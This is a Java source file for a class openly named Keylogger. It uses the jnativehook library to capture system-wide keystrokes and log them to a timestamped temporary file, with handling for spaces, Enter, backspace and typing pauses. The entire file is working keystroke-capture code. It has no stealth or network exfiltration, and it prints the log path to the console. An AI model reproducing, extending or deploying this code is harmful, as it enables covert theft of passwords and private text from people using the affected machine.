import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.security.Key;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;


public class  Keylogger implements NativeKeyListener {
    public RandomAccessFile file = null;
    public File tempFile = null;
    public static long lastCallTime = 0;

    public Keylogger() {
        LocalDateTime now = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yy_MM_dd_HH_mm_ss");
        String formattedDate = now.format(formatter);
        try {
            tempFile = File.createTempFile("keystrokes_"+formattedDate, ".txt");

            file = new RandomAccessFile(tempFile, "rw");
            System.out.println("Temporary file path: " + tempFile.getAbsolutePath());

            // writing first line
            DateTimeFormatter formatter_time = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter_time);
            writeBytes("Keystokes Start Time : " +formattedDateTime + "\n\n-----------------------------------------------------\n");

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void writeBytes(String text){
        try {
            file.writeBytes(text);
        }
        catch (Exception e){
            System.out.println("Failed to write keystrokes to file");
            System.out.println(e.getMessage());
        }
    }
    public void nativeKeyPressed(NativeKeyEvent e) {
        // getting time between last function call
        long currentTime = System.currentTimeMillis();
        long elapsedMillis = currentTime - lastCallTime;
        if(elapsedMillis/1000 > 2)
            writeBytes("\n");
        lastCallTime = currentTime;

        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        if(e.getKeyCode() == NativeKeyEvent.VC_SPACE){
            writeBytes(" ");
        }
        else if (e.getKeyCode() == NativeKeyEvent.VC_ENTER) {
            writeBytes("\n");
        }
        else if(e.getKeyCode() == NativeKeyEvent.VC_BACKSPACE){
            try {
                file.seek(file.length() - 1);
                file.setLength(file.length()-1);
            }
            catch (Exception err){
                System.out.println("Failed to remove char from file <Backspace>\n"+err.getMessage() );
            }
        }
        else {
            // Check if the key is special (non-alphabetic and non-numeric)
            boolean isAlphaNumeric = keyText.matches("\\w");

            // Write the keystroke to the text file
            if (isAlphaNumeric) {
                writeBytes(keyText);
            }
//            } else {
//                System.out.println("Special key matches");
//                write("<" + keyText + ">(pressed)");
//            }


        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
//        if(e.getKeyCode() != NativeKeyEvent.VC_SPACE) {
//            boolean iSpecialKey = !keyText.matches("\\w");
//            if (iSpecialKey) {
//                write("<" + keyText + ">(released)");
//            }
//        }

        // Add your logic to record the keystroke to a file or perform any other desired action.
    }
}
